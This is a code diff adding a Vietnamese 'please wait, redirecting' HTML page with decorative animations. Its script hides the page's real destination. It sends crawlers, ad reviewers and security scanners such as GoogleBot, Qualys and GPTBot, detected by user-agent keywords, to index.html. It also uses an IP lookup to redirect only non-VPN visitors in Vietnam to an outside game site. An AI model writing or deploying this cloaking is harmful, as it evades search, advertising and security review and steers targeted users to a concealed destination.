@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Đang chuyển hướng...</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(to bottom, #2c3e50, #4ca1af); /* Background chuyển màu sang trọng */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+            color: #fff;
+            text-align: center;
+        }
+
+        h1 {
+            font-size: 36px;
+            margin-bottom: 20px;
+            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.7);
+        }
+
+        p {
+            font-size: 20px;
+            margin-top: 10px;
+            animation: fadeInOut 4s infinite;
+        }
+
+        @keyframes fadeInOut {
+            0%, 100% { opacity: 0; }
+            50% { opacity: 1; }
+        }
+
+        .sky {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            top: 0;
+            left: 0;
+        }
+
+        .cloud {
+            position: absolute;
+            background: #fff;
+            border-radius: 100%;
+            box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
+            animation: moveClouds 20s linear infinite;
+            opacity: 0.7;
+        }
+
+        @keyframes moveClouds {
+            0% { transform: translateX(-200px); }
+            100% { transform: translateX(100%); }
+        }
+
+        .bird {
+            position: absolute;
+            animation: flyBird 8s linear infinite;
+            top: 50px;
+        }
+
+        @keyframes flyBird {
+            0% { transform: translateY(0); }
+            50% { transform: translateY(20px); }
+            100% { transform: translateY(0); }
+        }
+
+        .cloud:nth-child(1) { top: 10%; left: -150px; width: 200px; height: 60px; animation-duration: 25s; }
+        .cloud:nth-child(2) { top: 30%; left: -250px; width: 300px; height: 80px; animation-duration: 35s; }
+        .cloud:nth-child(3) { top: 60%; left: -100px; width: 150px; height: 50px; animation-duration: 20s; }
+
+        .bird:nth-child(1) { left: 20%; animation-duration: 8s; }
+        .bird:nth-child(2) { left: 40%; animation-duration: 10s; }
+        .bird:nth-child(3) { left: 60%; animation-duration: 6s; }
+    </style>
+</head>
+<body>
+    <div class="sky">
+        <div class="cloud"></div>
+        <div class="cloud"></div>
+        <div class="cloud"></div>
+        <div class="bird"><img src="bird1.png" alt="Bird 1"></div>
+        <div class="bird"><img src="bird2.png" alt="Bird 2"></div>
+        <div class="bird"><img src="bird3.png" alt="Bird 3"></div>
+    </div>
+
+    <h1>Vui lòng đợi trong giây lát...</h1>
+    <p>Đang chuyển hướng, xin đợi 2 giây...</p>
+
+    <script>
+        function getIPInfo(callback) {
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => callback(data));
+        }
+
+        function redirectToDestination() {
+            window.location.href = "https://taisieuno.us/game/"; // URL trang đích
+        }
+
+        function checkAccess() {
+            const userAgent = navigator.userAgent;
+            const botKeywords = ["GoogleBot", "Qualys", "Amazonbot", "BingBot", "Synthetic Bot", "Google AdsBot", "Taboola", "GoogleOther", "GPTBot", "Google Image Proxy"];
+            const isBot = botKeywords.some(bot => userAgent.includes(bot));
+
+            if (isBot) {
+                window.location.href = "index.html"; // Nếu là bot, quay về trang index
+                return;
+            }
+
+            getIPInfo((ipInfo) => {
+                const isVietnam = ipInfo.country === "VN";
+                const isProxyOrVPN = ipInfo.org && ipInfo.org.toLowerCase().includes("vpn");
+
+                if (isVietnam && !isProxyOrVPN) {
+                    setTimeout(redirectToDestination, 2000); // Chuyển hướng sau 2 giây nếu là người dùng hợp lệ
+                } else {
+                    window.location.href = "index.html"; // Nếu không hợp lệ, quay về trang index
+                }
+            });
+        }
+
+        document.addEventListener("DOMContentLoaded", checkAccess);
+    </script>
+</body>
+</html>
